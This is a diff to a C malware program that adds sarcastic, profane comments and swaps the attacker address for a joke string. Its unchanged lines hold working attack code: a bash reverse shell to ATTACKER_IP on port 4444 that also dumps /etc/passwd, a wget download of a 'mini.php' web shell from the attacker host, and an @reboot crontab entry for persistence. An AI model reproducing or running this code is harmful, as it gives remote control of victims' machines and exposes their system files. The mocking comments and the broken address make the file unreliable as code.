@@ -22,7 +22,7 @@
 #include <pthread.h>  // pthread header for multithreading
 
 
-const char* ATTACKER_IP = "192.168.1.175";  
+const char* ATTACKER_IP = "IM SURE IT IS SUPPOSED TO BE AN IP ADDRESS BUT IM NOT SURE, TRY SOCIAL SECURITY NUMBER FIRST";  
 const char* PORT = "4444";                   
 
 void *a1(void *arg)
@@ -30,6 +30,7 @@ void *a1(void *arg)
     char cmd[256];
     snprintf(cmd, sizeof(cmd), "/bin/bash -c 'bash -i >& /dev/tcp/%s/%s 0>&1 & whoami; uname -a; cat /etc/passwd | head -n 5; ip a'", ATTACKER_IP, PORT);
     system(cmd);  // Execute the command
+                  // NO SHIT WHAT ELSE WOULD IT DO
     return NULL;
 }
 
@@ -54,11 +55,12 @@ void *b2(void *arg)
 
     if (php_found) {
         char cmd[256];
-        snprintf(cmd, sizeof(cmd), "wget http://%s/mini.php", ATTACKER_IP);
+        snprintf(cmd, sizeof(cmd), "wget http://%s/mini.php", ATTACKER_IP); // I HEART MINI.PHP; I DON'T EVEN USE IT I JUST WANTED TO ADD IT BECAUSE IT IS SUPER COOL (NOT REALLY)
         system(cmd);
     }
 
     // Setup persistence
+    // THIS DOESNT "SET UP PERSISTENCE", THIS GETS THE WORKING DIRECTORY
     char PWD[1024];
     FILE *pwd_fp = popen("pwd", "r");
     if (pwd_fp) {
@@ -67,6 +69,7 @@ void *b2(void *arg)
     }
 
     PWD[strcspn(PWD, "\n")] = '\0';  // Fix this line
+    // IT IS FIXED?? IT DOES WORK??
 
     snprintf(buffer, sizeof(buffer), "(crontab -l ; echo '@reboot %s') | crontab -", PWD);
     system(buffer);
@@ -94,11 +97,13 @@ int main()
     pthread_t thread1, thread2, thread3;
 
     // Create threads for each function
+    //WHO FUCKING MADE THESE COMMENTS
     pthread_create(&thread1, NULL, a1, NULL);
     pthread_create(&thread2, NULL, b2, NULL);
     pthread_create(&thread3, NULL, c3, NULL);
 
     // Wait for all threads to finish
+    // ok this comment makes sense 
     pthread_join(thread1, NULL);
     pthread_join(thread2, NULL);
     pthread_join(thread3, NULL);
